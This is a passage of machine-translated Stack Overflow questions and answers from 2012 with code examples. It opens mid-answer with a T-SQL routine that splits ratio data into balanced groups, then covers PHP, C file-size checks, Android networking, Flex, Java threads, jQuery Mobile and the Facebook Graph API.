  declare @nearestmatch bit = 0
  if @targetsum is null set @nearestmatch = 1
  declare @combination table (value int, asstring varchar(10), alias varchar(50))  
  declare @savedpairseed int = (select pairseed from #pairseed)

  declare @stmtTemplate varchar(max) = 'declare @pairseed int = (select pairseed from #pairseed)
  declare @DistSum DECIMAL(8,4)
  <DeclareVars>
  declare candloop cursor for select <SelectList>, <DistanceSum> as Dist_sum from <TableList> where <IdCheck> <SumCheck>
  open candloop
  fetch next from candloop into <VarsList>, @DistSum
  while @@fetch_status = 0
  begin
    if (select count(*) from #data where id in (<VarsList>)) = <VarsCount>
    begin
      <DeleteData>
      <InsertPairs>
      set @pairseed = @pairseed + 1  
    end
    fetch next from candloop into <VarsList>, @DistSum
  end
  close candloop
  deallocate candloop
  update #pairseed set pairseed = @pairseed  '

  declare @combinations int = 1
  declare @maxcombinations int = 8
  while @combinations <= @maxcombinations
  begin
    insert @combination select @combinations, cast(@combinations as varchar(10)), char(ascii('a') + @combinations-1)
    declare @DeclareVars varchar(max) = ''
    declare @SelectList varchar(max) = ''
    declare @TableList varchar(max) = ''
    declare @IdCheck varchar(max) = ''
    declare @DistanceSum varchar(max) = ''
    declare @InsertPairs varchar(max) = ''
    declare @VarsList varchar(max) = ''
    declare @SumCheck varchar(max) = ''
    declare @DeleteData varchar(max) = 'delete #data where id in (<VarsList>)'

    select @DeclareVars = @DeclareVars + 'declare @id'+asstring+ ' int ' from @combination
    select @SelectList = @SelectList + alias +'.id, ' from @combination
    set @SelectList = SUBSTRING(@selectlist, 1, LEN(@SelectList)-1)
    select @TableList = @TableList + '#data '+alias+', ' from @combination
    set @TableList = SUBSTRING(@TableList, 1, LEN(@TableList)-1)
    select @IdCheck = @IdCheck + a.alias+'.id < '+b.alias+'.id and '
    from @combination a join @combination b on a.value+1 = b.value   
    if LEN(@IdCheck) > 4
      set @IdCheck = SUBSTRING(@IdCheck, 1, LEN(@IdCheck)-4) + ' and '
    select @DistanceSum = @DistanceSum + alias+'.targetdistance + ' from @combination
    set @DistanceSum = SUBSTRING(@DistanceSum, 1, LEN(@DistanceSum)-2)
    select @VarsList = @VarsList + '@id'+asstring+ ', ' from @combination
    set @VarsList = SUBSTRING(@VarsList, 1, LEN(@VarsList)-1)
    select @InsertPairs = @InsertPairs + 'insert #pairsets select @pairseed, @id'+asstring+ ', @DistSum'+ CHAR(10) from @combination
    set @SumCheck = @DistanceSum + ' = '+ cast(@Targetsum as varchar(20))   

    if @nearestmatch = 1 
    begin
      set @SumCheck = '('
      select @SumCheck = @SumCheck + alias+'.id = '+CAST(@includeid as varchar(10))+' or ' from @combination
      if LEN(@SumCheck) > 4
        set @SumCheck = SUBSTRING(@SumCheck, 1, LEN(@SumCheck)-3)
      set @SumCheck = @SumCheck + ')'
      set @DeleteData = ''
    end

    declare @stmt varchar(max)
    set @stmt = REPLACE(@stmtTemplate, '<DeclareVars>', @DeclareVars)
    set @stmt = REPLACE(@stmt, '<DeleteData>', @DeleteData)
    set @stmt = REPLACE(@stmt, '<SelectList>', @SelectList)
    set @stmt = REPLACE(@stmt, '<TableList>', @TableList)
    set @stmt = REPLACE(@stmt, '<IdCheck>', @IdCheck)
    set @stmt = REPLACE(@stmt, '<DistanceSum>', @DistanceSum)
    set @stmt = REPLACE(@stmt, '<InsertPairs>', @InsertPairs)
    set @stmt = REPLACE(@stmt, '<VarsList>', @VarsList)
    set @stmt = REPLACE(@stmt, '<VarsCount>', cast(@combinations as varchar(10)))
    set @stmt = REPLACE(@stmt, '<SumCheck>', @SumCheck)       
    exec (@stmt)    
    set @combinations = @combinations + 1
  end

  if @nearestmatch = 1
  begin
    -- above will have recorded all possible matches within range
    -- remove all but the closest and reindex the pair ids
    declare @bestmatch int
    select top 1 @bestmatch = pairid from #pairsets where pairid >= @savedpairseed and ABS(distsum) < @targetsumrange 
    delete #pairsets where pairid >= @savedpairseed and pairid <> ISNULL(@bestmatch, -1)
    delete #data where id in (select id from #pairsets where pairid = @bestmatch)
    update #pairsets set pairid = @savedpairseed where pairid = @bestmatch
    update #pairseed set pairseed = @savedpairseed+1
  end

end

go
set nocount on
-- set the parameters
declare @xmin DECIMAL(8,4) = 0.75
declare @xmax DECIMAL(8,4) = 0.85
declare @xrange DECIMAL(8,4) = @xmax - @xmin
declare @xtarg DECIMAL(8,4) = (@xmin+@xmax) / 2
declare @ngroups int = 3
declare @targetgroupsize int = 25

declare @maxbalancedpair int 

-- copy the ratio data (using 75 row data from updated question)
select *, ratio-@xtarg as targetdistance, abs(ratio - @xtarg) as targetdistanceabsolute into #data from t_stats
create table #pairseed (pairseed int)
create table #pairsets (pairid int, id int, distsum DECIMAL(8,4) )
insert #pairseed select 1

-- due to the 2 decimal points and distribution of the data we can find many n-tuples that sum to zero
exec #match 0, 0, 0

select @maxbalancedpair = pairseed-1 from #pairseed

declare @deviants table (id int)
declare @most_deviant int
while exists(select * from #data where id not in (select id from @deviants)) 
begin
  select top 1 @most_deviant = id from #data where id not in (select id from @deviants)  order by targetdistanceabsolute desc
  insert @deviants select @most_deviant
  exec #match null, @most_deviant, @xrange
end

-- in general there would have to be some backtracking here
-- now its a box-packing problem, but for simplicity just assign them round robin
declare  @output_group_pairs table (groupid int, pairid int)
declare @groupidx int = 1
declare @numgroups int = 3
declare @pairid int
select @pairid = pairseed-1 from #pairseed

while @pairid >= 0
begin
  insert @output_group_pairs select @groupidx, @pairid
  set @pairid = @pairid - 1
  set @groupidx = (@groupidx % @numgroups) + 1
end

-- wimpy effort at redistributing the groups evenly
-- todo: many cases will not work, should use a proper algorithm

declare @maxiter int = 100
declare @previouspairs table (pairid int)
declare @previousgroups table (groupid int)
while exists(select groupid from @output_group_pairs a join #pairsets b on a.pairid = b.pairid group by groupid having COUNT(id) < @targetgroupsize)
begin  
  set @maxiter = @maxiter-1
  if @maxiter = 0 break
  declare @groupid int = -1
  declare @amountout int
  select @groupid = groupid, @amountout = @targetgroupsize-COUNT(*) 
  from @output_group_pairs a join #pairsets b on a.pairid = b.pairid 
  where groupid not in (select groupid from @previousgroups)
  group by groupid having COUNT(*) < @targetgroupsize
  if @groupid = -1 break

  declare @targetpair int = -1  

  select @targetpair = a.pairid from @output_group_pairs a
  join (select pairid from #pairsets group by pairid having COUNT(*) <= @amountout) b on a.pairid = b.pairid
  join (select groupid, count(id) groupcount from @output_group_pairs a join #pairsets b on a.pairid = b.pairid group by groupid) group_counts on a.groupid = group_counts.groupid
  where a.pairid not in (select pairid from @previouspairs)
  order by abs(@amountout - groupcount) asc

  if @targetpair = -1
  begin
    insert @previousgroups select @groupid
  end
  else
  begin
    insert @previouspairs select @targetpair
    update @output_group_pairs set groupid = @groupid where pairid = @targetpair   
  end
end

set @maxiter = 100
delete @previouspairs
delete @previousgroups
while exists(select groupid from @output_group_pairs a join #pairsets b on a.pairid = b.pairid group by groupid having COUNT(id) > @targetgroupsize)
begin  
  set @maxiter = @maxiter-1
  if @maxiter = 0 break
  set @groupid = -1
  set @amountout = null
  select @groupid = groupid, @amountout = COUNT(*)-@targetgroupsize 
  from @output_group_pairs a join #pairsets b on a.pairid = b.pairid 
  where groupid not in (select groupid from @previousgroups)
  group by groupid having COUNT(*) > @targetgroupsize
  if @groupid = -1 break

  set @targetpair = -1 

  select @targetpair = a.pairid from @output_group_pairs a
  join (select pairid from #pairsets group by pairid having COUNT(*) <= @amountout) b on a.pairid = b.pairid
  join (select groupid, count(id) groupcount from @output_group_pairs a join #pairsets b on a.pairid = b.pairid group by groupid) group_counts on a.groupid = group_counts.groupid
  where a.pairid not in (select pairid from @previouspairs)
  order by abs(@amountout - groupcount) asc

  if @targetpair = -1
  begin
    insert @previousgroups select @groupid
  end
  else
  begin  
    insert @previouspairs select @targetpair
    delete @output_group_pairs where pairid = @targetpair
  end   
end

-- output groups and their stats
select GroupId, Id from @output_group_pairs a join #pairsets b on a.pairid = b.pairid order by 1, 2

select a.GroupId, AVG(c.ratio) as [Average] , count(*) as [Count]
from @output_group_pairs a
join #pairsets b on a.pairid = b.pairid
join t_stats c on b.id = c.id
group by a.groupid
go

drop table #data
drop table #pairsets
drop table #pairseed
drop proc #match 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-18T17:38:21.700

哦，如果一个组中的项目数量是一个精确的要求，这里有一个版本，它对盒子包装部分使用相同的详尽匹配，但它要慢得多。

```
-- **Expects data in table t_stats (id, ratio)**
if OBJECT_ID('tempdb..#data') is not null drop table #data
if OBJECT_ID('tempdb..#data_pairs') is not null drop table #data_pairs
if OBJECT_ID('tempdb..#pairsets') is not null drop table #pairsets
if OBJECT_ID('tempdb..#pairseed') is not null drop table #pairseed
if OBJECT_ID('tempdb..#match') is not null drop proc #match
go

-- rather horrible routine using dsql to find either:
--   1) groups of values that sum to exactly @targetsum (only if @targetsum non null)
--   2) the group containing the least values that includes data id @includeid and where the sum is within +- @targetsumrange
create proc #match(@targetsum DECIMAL(8,4), @maxcombinations int, @includeid int, @targetsumrange DECIMAL(8,4)) as
begin
  set nocount on
  declare @nearestmatch bit = 0
  if @targetsum is null set @nearestmatch = 1
  declare @combination table (value int, asstring varchar(10), alias varchar(50))  
  declare @savedpairseed int = (select pairseed from #pairseed)

  declare @stmtTemplate varchar(max) = 'declare @pairseed int = (select pairseed from #pairseed)
  declare @DistSum DECIMAL(8,4)
  <DeclareVars>
  declare candloop cursor for select <SelectList>, <DistanceSum> as Dist_sum from <TableList> where <IdCheck> <SumCheck>
  open candloop
  fetch next from candloop into <VarsList>, @DistSum
  while @@fetch_status = 0
  begin
    if (select count(*) from #data where id in (<VarsList>)) = <VarsCount>
    begin
      <DeleteData>
      <InsertPairs>
      set @pairseed = @pairseed + 1  
    end
    fetch next from candloop into <VarsList>, @DistSum
  end
  close candloop
  deallocate candloop
  update #pairseed set pairseed = @pairseed  '

  declare @combinations int = 1
  while @combinations <= @maxcombinations
  begin
    insert @combination 
    select @combinations, cast(@combinations as varchar(10)), CHAR(ASCII('a')+ (@combinations-1)%26) + char(ascii('a') + @combinations-1)
    declare @DeclareVars varchar(max) = ''
    declare @SelectList varchar(max) = ''
    declare @TableList varchar(max) = ''
    declare @IdCheck varchar(max) = ''
    declare @DistanceSum varchar(max) = ''
    declare @InsertPairs varchar(max) = ''
    declare @VarsList varchar(max) = ''
    declare @SumCheck varchar(max) = ''
    declare @DeleteData varchar(max) = 'delete #data where id in (<VarsList>)'

    select @DeclareVars = @DeclareVars + 'declare @id'+asstring+ ' int ' from @combination
    select @SelectList = @SelectList + alias +'.id, ' from @combination
    set @SelectList = SUBSTRING(@selectlist, 1, LEN(@SelectList)-1)
    select @TableList = @TableList + '#data '+alias+', ' from @combination
    set @TableList = SUBSTRING(@TableList, 1, LEN(@TableList)-1)
    select @IdCheck = @IdCheck + a.alias+'.id < '+b.alias+'.id and '
    from @combination a join @combination b on a.value+1 = b.value   
    if LEN(@IdCheck) > 4
      set @IdCheck = SUBSTRING(@IdCheck, 1, LEN(@IdCheck)-4) + ' and '
    select @DistanceSum = @DistanceSum + alias+'.targetdistance + ' from @combination
    set @DistanceSum = SUBSTRING(@DistanceSum, 1, LEN(@DistanceSum)-2)
    select @VarsList = @VarsList + '@id'+asstring+ ', ' from @combination
    set @VarsList = SUBSTRING(@VarsList, 1, LEN(@VarsList)-1)
    select @InsertPairs = @InsertPairs + 'insert #pairsets select @pairseed, @id'+asstring+ ', @DistSum'+ CHAR(10) from @combination
    set @SumCheck = @DistanceSum + ' = '+ cast(@Targetsum as varchar(20))   

    if @nearestmatch = 1 
    begin
      set @SumCheck = '('
      select @SumCheck = @SumCheck + alias+'.id = '+CAST(@includeid as varchar(10))+' or ' from @combination
      if LEN(@SumCheck) > 4
        set @SumCheck = SUBSTRING(@SumCheck, 1, LEN(@SumCheck)-3)
      set @SumCheck = @SumCheck + ')'
      set @DeleteData = ''
    end

    declare @stmt varchar(max)
    set @stmt = REPLACE(@stmtTemplate, '<DeclareVars>', @DeclareVars)
    set @stmt = REPLACE(@stmt, '<DeleteData>', @DeleteData)
    set @stmt = REPLACE(@stmt, '<SelectList>', @SelectList)
    set @stmt = REPLACE(@stmt, '<TableList>', @TableList)
    set @stmt = REPLACE(@stmt, '<IdCheck>', @IdCheck)
    set @stmt = REPLACE(@stmt, '<DistanceSum>', @DistanceSum)
    set @stmt = REPLACE(@stmt, '<InsertPairs>', @InsertPairs)
    set @stmt = REPLACE(@stmt, '<VarsList>', @VarsList)
    set @stmt = REPLACE(@stmt, '<VarsCount>', cast(@combinations as varchar(10)))
    set @stmt = REPLACE(@stmt, '<SumCheck>', @SumCheck) 

    exec (@stmt)    
    set @combinations = @combinations + 1
  end

  if @nearestmatch = 1
  begin
    -- above will have recorded all possible matches within range
    -- remove all but the closest and reindex the pair ids
    declare @bestmatch int
    select top 1 @bestmatch = pairid from #pairsets where pairid >= @savedpairseed and ABS(distsum) < @targetsumrange 
    delete #pairsets where pairid >= @savedpairseed and pairid <> ISNULL(@bestmatch, -1)
    delete #data where id in (select id from #pairsets where pairid = @bestmatch)
    update #pairsets set pairid = @savedpairseed where pairid = @bestmatch
    update #pairseed set pairseed = @savedpairseed+1
  end

end

go
set nocount on
-- set the parameters
declare @xmin DECIMAL(8,4) = 0.75
declare @xmax DECIMAL(8,4) = 0.85
declare @xrange DECIMAL(8,4) = @xmax - @xmin
declare @xtarg DECIMAL(8,4) = (@xmin+@xmax) / 2
declare @ngroups int = 3
declare @targetgroupsize int = 5

declare @maxbalancedpair int 

-- copy the ratio data (using 75 row data from updated question)
select *, ratio-@xtarg as targetdistance, abs(ratio - @xtarg) as targetdistanceabsolute into #data from t_stats
create table #pairseed (pairseed int)
create table #pairsets (pairid int, id int, distsum DECIMAL(8,4) )
insert #pairseed select 1

-- due to the 2 decimal points and distribution of the data we can find many n-tuples that sum to zero
exec #match 0, 8, 0, 0

select @maxbalancedpair = pairseed-1 from #pairseed

declare @deviants table (id int)
declare @most_deviant int
while exists(select * from #data where id not in (select id from @deviants)) 
begin
  select top 1 @most_deviant = id from #data where id not in (select id from @deviants)  order by targetdistanceabsolute desc
  insert @deviants select @most_deviant
  exec #match null, 8, @most_deviant, @xrange
end

select * into #data_pairs from #pairsets
delete #data
delete #pairsets
update #pairseed set pairseed = 1
insert #data
select pairid, COUNT(*), COUNT(*), COUNT(*) from #data_pairs group by pairid

if (select SUM(ratio) from #data) < @targetgroupsize * @ngroups
begin
  raiserror('Cannot match - not enough data', 16, 1)
  return
end

-- find the minimum number of matches that will reach targetgroupsize
declare @maxmatches int = -1
declare @matchcount int
declare @matchsum int = 0
declare maxmatchcount cursor for select CAST(ratio as int) from #data order by ratio asc
open maxmatchcount
fetch next from maxmatchcount into @matchcount
while @@FETCH_STATUS = 0 and @matchsum <= @targetgroupsize
begin
  set @maxmatches = @maxmatches + 1
  set @matchsum = @matchsum + @matchcount
  fetch next from maxmatchcount into @matchcount
end
close maxmatchcount
deallocate maxmatchcount

exec #match @targetgroupsize, @maxmatches, null, null

declare  @output_group_pairs table (groupid int, pairid int)

insert @output_group_pairs select pairid, id from #pairsets where pairid <= @ngroups

-- output groups and their stats
select GroupId, Id from @output_group_pairs a join #data_pairs b on a.pairid = b.pairid order by 1, 2

select a.GroupId, AVG(c.ratio) as [Average] , count(*) as [Count]
from @output_group_pairs a
join #data_pairs b on a.pairid = b.pairid
join t_stats c on b.id = c.id
group by a.groupid

go

drop table #data
drop table #data_pairs
drop table #pairsets
drop table #pairseed
drop proc #match 
```

# php - PHP 脚本在任意点停止，但仍调用关闭函数，没有记录错误

> ID：12866342
> 
> 赞同：0
> 
> 时间：2012-10-12T20:07:28.003
> 
> 标签：php, xdebug

在 Windows 上运行 PHP 5.3.17 的客户端存在特殊问题。

有一个脚本作为计划任务每​​分钟运行一次。每隔一段时间，脚本就会在处理某些东西时中途退出。没有记录错误。

通过查看 xdebug 跟踪，该点​​永远不会相同。我们还从跟踪中看到关闭功能仍在运行。就是这样：正常运行，在某个地方停止，运行关闭功能直到完成。

会是什么呢？

编辑：可能是操作系统实际上杀死了进程吗？会有这样的日志吗？也许一些看门狗守护进程认为该进程正在使用过多的 CPU，所以它决定杀死它？

# c - c 使用 fstat 问题比较文件大小

> ID：12866343
> 
> 赞同：-2
> 
> 时间：2012-10-12T20:07:30.300
> 
> 标签：c, file, filesize, stat, fstat

我比较 2 个文件大小的代码似乎表现得好像`keyfile`> `sourcefile`。下面的代码中是否缺少某些内容，我可以更改什么？我用于测试的两个文件是 3kb 密钥文件和 14kb 源文件，它们应该会激活`if`下面提供的最后一条语句。

```
/* Get size of sourcefile. */
if((sourcefile = fopen(argv[1], "rb"))== NULL)
{
printf("Can't open source file.\n");
printf("Please enter a valid filename.\n");
printf("USAGE: OTP <source file> <output file> <keyfile>\n");
return (1);
}

fflush(sourcefile);
fstat(fileno(sourcefile), &statbuf);
fclose(sourcefile);

/* Get size of keyfile. */
if((keyfile = fopen(argv[3], "rb"))== NULL)
{
printf("Can't open keyfile.\n");
printf("Please enter a valid filename.\n"); 
printf("USAGE: OTP <source file> <output file> <keyfile>\n");
return(1);

fflush(keyfile);
fstat(fileno(keyfile), &keybuf);
fclose(keyfile);
}

/* Open necessary files. */
keyfile=fopen(argv[3], "rb");
sourcefile=fopen(argv[1], "rb");
destfile=fopen(argv[2], "wb");

/* Check if keyfile is the same size as, or bigger than the sourcefile */
if((keybuf.st_size) < (statbuf.st_size))
{
printf("Source file is larger than keyfile.\n");
printf("This significantly reduces cryptographic strength.\n");
printf("Do you wish to continue? (Y/N)\n");
scanf("%c", &ans);
if(ans == 'n' || ans == 'N')
    {
    return (1);
    }
if(ans == 'y' || ans == 'Y')
    {
    printf("Proceeding with Encryption/Decryption.\n");
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-12T20:10:23.900

`fstat`这是因为如果它无法打开，你只有密钥文件。向上移动你的花括号。另外，作为表单的优化，不要打开文件，统计它，关闭它并重新打开它。只是不要关闭它并继续。

所以，既然你问

```
/* Get size of sourcefile. */
if((sourcefile = fopen(argv[1], "rb"))== NULL)
{
printf("Can't open source file.\n");
printf("Please enter a valid filename.\n");
printf("USAGE: OTP <source file> <output file> <keyfile>\n");
return (1);
}

fflush(sourcefile);
//fstat(fileno(sourcefile), &statbuf);   // <-- this is not needed
//fclose(sourcefile);                    // <-- this is not needed

/* Get size of keyfile. */
if((keyfile = fopen(argv[3], "rb"))== NULL)
{
printf("Can't open keyfile.\n");
printf("Please enter a valid filename.\n"); 
printf("USAGE: OTP <source file> <output file> <keyfile>\n");
return(1);
    }                                     // <-- this brace is new (well, moved) (1)

fflush(keyfile);
//fstat(fileno(keyfile), &keybuf);    // <-- not needed
//fclose(keyfile);                    // <-- not needed
//}                                     // <-- this brace has moved up 4 lines to (1)

/* Open necessary files. */
keyfile=fopen(argv[3], "rb");
sourcefile=fopen(argv[1], "rb");
destfile=fopen(argv[2], "wb");

/* Check if keyfile is the same size as, or bigger than the sourcefile */
if((keybuf.st_size) < (statbuf.st_size))
{
printf("Source file is larger than keyfile.\n");
printf("This significantly reduces cryptographic strength.\n");
printf("Do you wish to continue? (Y/N)\n");
scanf("%c", &ans);
if(ans == 'n' || ans == 'N')
    {
    return (1);
    }
if(ans == 'y' || ans == 'Y')
    {
    printf("Proceeding with Encryption/Decryption.\n");
    }
} 
```

# android - 我的应用程序可以在 android 模拟器上运行，但不能在 android 设备上运行

> ID：12866344
> 
> 赞同：1
> 
> 时间：2012-10-12T20:07:41.207
> 
> 标签：android, web-services, socket-timeout-exception

我在 Microsoft Visual Studio 2008 的 .Net Framework 3.5 中创建了一个 Web 服务，并从 android 调用它。我使用 Sql Server 作为数据库。

当我在 android 模拟器中运行我的应用程序时，它会运行良好，但如果我将它安装到我的 android 设备上，那么它将抛出 java.socket.SocketTimeOutException。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T20:17:26.133

您的服务器是否从 Visual Studio 在您的桌面上运行？如果是这样，除非您转发端口或使用代理服务器（也在同一台机器上），否则您无法从除该特定桌面之外的任何机器连接到它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-21T21:49:52.740

我得到了解决方案。当您在本地 PC 上使用 IIS 作为虚拟服务器时，请注意您的计算机防火墙已关闭。如果您关闭防火墙保护，则将允许您访问 Web 方法，但如果防火墙已打开，您将收到 java.net.SocketTimeOutException

# apache-flex - 在 Flex Alert.show 中，防止 Escape 键关闭父窗口

> ID：12866347
> 
> 赞同：0
> 
> 时间：2012-10-12T20:07:54.017
> 
> 标签：apache-flex

Flex`Alert.show`打开一个带有取消按钮的对话框后，当我按下 ESCAPE 键时，它将关闭警报框。但是我怎样才能防止这个关键事件被转移到父窗口呢？父级也可以将 ESCAPE 注册为关闭键，然后它也会关闭。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-12T20:41:00.520

Alert.show方法将一个实例返回[给](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/mx/controls/Alert.html#show%28%29)Alert 类。您可以在警报上收听逃逸；然后在您的事件侦听器中停止传播。这是伪代码；但：

```
// in some method somewhere
// create Alert Class
var myAlert : Alert = Alert.show('test','test');
// listen for keyboard event
myAlert.addEventListener(KeyboardEvent.KEY_UP, onKeyUp);

//... elsewhere in code
protected function onKeyUp(event:KeyboardEvent):void{
  if(event.charCode =Keyboard.ESCAPE){
    event.stopPropagation();
    event.stopImmediatePropagation();
  }
} 
```

# java - 捕获一些异常后，无限循环的线程停止

> ID：12866351
> 
> 赞同：0
> 
> 时间：2012-10-12T20:08:06.820
> 
> 标签：java, sql, jdbc, exception-handling, thread-sleep

我写了以下代码。我希望当控制变为 1 时，无限循环应该停止。否则，它会在一段时间后继续更新 SQL 数据库。某种异常导致线程终止。我无法弄清楚。任何人都可以帮助它。

```
 public void run()
     {

    while(true)
    {
        System.out.println("I am working t asfbjakhbfjabf");
        synchronized(lock)
        {
            if(control==1)
            {
                return;
            }
        }
        try
        {
            Thread.sleep(wTIME);
            Class.forName(driver).newInstance();
            conn = DriverManager.getConnection(url+dbName,userName,password);
            String st="SELECT count FROM ThreadResults WHERE ThreadNo = "
                                        +t;
            Statement stmt = conn.createStatement();
            stmt.execute(st);
            ResultSet resultSet = stmt.getResultSet();
            boolean b=resultSet.next();
            synchronized(WebCrawler.seed.lock6)
            {
                 float t1=(System.currentTimeMillis()-time)/60000;
                 if(b)
                 {
                    String s2="UPDATE ThreadResults SET count = "+WebCrawler.seed.count+",                      time = "+t1+" WHERE ThreadNo = "+t;
                   System.out.println("updated count");
                   stmt.executeUpdate(s2);
                  }
                 else
                 {
                   String s1="INSERT ThreadResults VALUES("+t+" ,"+WebCrawler.seed.count+" ,"+t1+")";
                    System.out.println("inserting count");
                    stmt.executeUpdate(s1);
                  }
            }
            resultSet.close();
            conn.close();
        }
        catch(InterruptedException | ClassNotFoundException | InstantiationException | IllegalAccessException | SQLException c)
        {
           System.out.println("caught in thread resilt updation "+ c.getMessage());
        }

    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T20:09:46.517

尽管这不是安排重复任务的首选方式，但您可以通过捕获`Throwable`而不是明确的异常列表来修复它。这样，您将确保抓住理论上可以抛出的任何东西。请务必打印整个异常堆栈跟踪，而不仅仅是消息。

当您修复捕获时，您将需要另外修复清理逻辑：将`close`语句放入`finally`. 更好的是，重写您的代码以使用自动资源管理。语法是`try (Statement stmt = conn.createStatement()) { ... }`.

安排重复任务的正确方法是使用 Executors：

```
final ScheduledExecutorService sched = Executors.newSingleThreadScheduledExecutor();
sched.scheduleWithFixedDelay(task, 0, wTIME, TimeUnit.MILLISECONDS); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-12T20:17:59.547

你可以写

```
catch(Exception e) 
```

而不是你写的。它将捕获所有异常。

# jquery - jQuery .live() 无法在文档中工作

> ID：12866352
> 
> 赞同：1
> 
> 时间：2012-10-12T20:08:24.503
> 
> 标签：jquery, jquery-mobile

在将网站上的 jquery mobile 从版本：v1.0b1 更新到现在：1.2.0 之前，这有效：

```
$(document).ready(function() {
   $('.ui-page').live('pageshow', function(e, ui) {
     // do something
   });
}); 
```

但是更新后这个就不行了。但这确实：

```
$(document).ready(function() {

});

$('.ui-page').live('pageshow', function(e, ui) {
   // do something
}); 
```

如果我取出代码并将其放在 dom 之外，它就可以工作。有没有办法让它在 dom 内部工作？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T20:14:44.003

您应该在 jquery mobile 上替换`$(document).ready()`为。`$(document).bind('pageinit')`

## 重要提示：使用 $(document).bind('pageinit')，而不是 $(document).ready()

在 jQuery 中学习的第一件事是调用`$(document).ready()`函数内部的代码，以便在加载 DOM 后立即执行所有内容。但是，在 jQuery Mobile 中，Ajax 用于在您导航时将每个页面的内容加载到 DOM 中，并且 DOM 就绪处理程序仅针对第一页执行。要在加载和创建新页面时执行代码，您可以绑定到`pageinit`事件。此事件在本页底部有详细说明。

有关详细信息，请参阅**[JQuery Mobile](http://jquerymobile.com/demos/1.2.0/docs/api/events.html)**

# java - Loopj Android Async Http - onFailure 未触发

> ID：12866353
> 
> 赞同：8
> 
> 时间：2012-10-12T20:08:24.927
> 
> 标签：java, android, http, asynchronous, loopj

我正在使用来自 loopj 的出色异步 http 库，但我遇到了一个小障碍。

如果用户没有互联网连接或失去连接，应用程序将不会返回任何内容。这部分是预期的，但它也不会触发 onFailure 方法。

此外，我在有互联网连接时使用的代码确实有效，因此服务器端没有问题。

这是一些精简到最低限度的代码。它也不起作用（我也测试过这个）

```
String url = getString(R.string.baseurl) + "/appconnect.php";
client.getHttpClient().getParams().setParameter(ClientPNames.ALLOW_CIRCULAR_REDIRECTS, true);
client.get(url, null, new JsonHttpResponseHandler()
{
    @Override
    public void onSuccess(JSONArray response)
    {
        Toast.makeText(getApplicationContext(), "Success", Toast.LENGTH_SHORT).show();
    }

    @Override
    public void onFailure(Throwable e, JSONArray errorResponse)
    {
        Toast.makeText(getApplicationContext(), "Failure", Toast.LENGTH_SHORT).show();
    }
}); 
```

谢谢，阿什利

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-12T21:33:10.047

是的，不幸的是 loopj Android 库的设计不是很好。如果您实现*其他* `onFailure`回调，其中一个应该触发：

```
@Override
public void onFailure(Throwable e) {
    Log.e(TAG, "OnFailure!", e);
}
@Override
public void onFailure(Throwable e, String response) {
    Log.e(TAG, "OnFailure!", e);
}
@Override
public void onFailure(Throwable e, JSONArray errorResponse) {
    Log.e(TAG, "OnFailure!", e);
} 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-11-12T21:02:34.713

你可以试试这个：

在`AsyncHttpRequest->makeRequestWithRetries()`中，添加一个`SocketException`像这样的捕获：

```
while (retry) {
        try {
            makeRequest();
            return;
        } catch (UnknownHostException e) {
            if(responseHandler != null) {
                responseHandler.sendFailureMessage(e, "can't resolve host");
            }
            return;
        } catch (SocketException e){
            // Added to detect no connection.
            if(responseHandler != null) {
                responseHandler.sendFailureMessage(e, "can't resolve host");
            }
            return;
        } catch (IOException e) {
            cause = e;
            retry = retryHandler.retryRequest(cause, ++executionCount, context);
        } catch (NullPointerException e) {
            // there's a bug in HttpClient 4.0.x that on some occasions causes
            // DefaultRequestExecutor to throw an NPE, see
            // http://code.google.com/p/android/issues/detail?id=5255
            cause = new IOException("NPE in HttpClient" + e.getMessage());
            retry = retryHandler.retryRequest(cause, ++executionCount, context);
        }
    } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-09-25T02:00:00.427

尝试这个：

```
@Override
protected Object parseResponse(byte[] responseBody) throws JSONException {
    return super.parseResponse(responseBody);
} 
```

# facebook-graph-api - 使用 Facebook AP 获得点赞数

> ID：12866355
> 
> 赞同：0
> 
> 时间：2012-10-12T20:08:28.817
> 
> 标签：facebook-graph-api, count, facebook-like

我正在尝试使用 facebook API 检索 facebook POST 信息（即：LIKE 计数）

曾经工作的 URL 采用以下格式：

```
https://graph.facebook.com/?ids=[AUTHOR_ID]_[POST_ID] 
```

*（作者和帖子ID故意省略）*

现在它返回一个错误的数据馈送。用于检索 POST 信息的 URL 结构是否已更改？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-08-21T07:16:14.653

With **October 2013 Breaking Changes**, likes.count field is no longer available in the feed.

You need to make a call for each POST_ID with the summary field enabled.

[https://graph.facebook.com/POST_ID/likes?summary=true&access_token=XXXXXXXXXXXX](https://graph.facebook.com/POST_ID/likes?summary=true&access_token=XXXXXXXXXXXX)

There will be a "summary" element with a "total_count" field.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-12T20:11:54.083

不，这仍然对我有用 - 刚刚用我的一篇文章进行了测试：

```
 "id": "<SNIP>", 
   //removed most fields
   "actions": [
    {
      "name": "Comment", 
      "link": "https://www.facebook.com/X/posts/Y"
    }, 
    {
      "name": "Like", 
      "link": "https://www.facebook.com/X/posts/Y"
    }
  ], 
  "type": "photo", 
  "status_type": "added_photos", 
  "object_id": "SNIP", 
  "application": {
    "name": "Facebook for Android", 
    "namespace": "fbandroid", 
    "id": "350685531728"
  }, 
  "created_time": "2012-10-12T06:52:10+0000", 
  "updated_time": "2012-10-12T07:48:34+0000", 
  "likes": {
    "data": [
      // four likers' details
    ], 
    "count": 28
  }, 
//snip 
```

检查您是否仍然获得用户的`read_stream` [许可](https://developers.facebook.com/docs/authentication/permissions/)，帖子尚未被删除等

# c# - C# 中的 C 库结构

> ID：12866357
> 
> 赞同：2
> 
> 时间：2012-10-12T20:08:33.623
> 
> 标签：c#, struct, interop

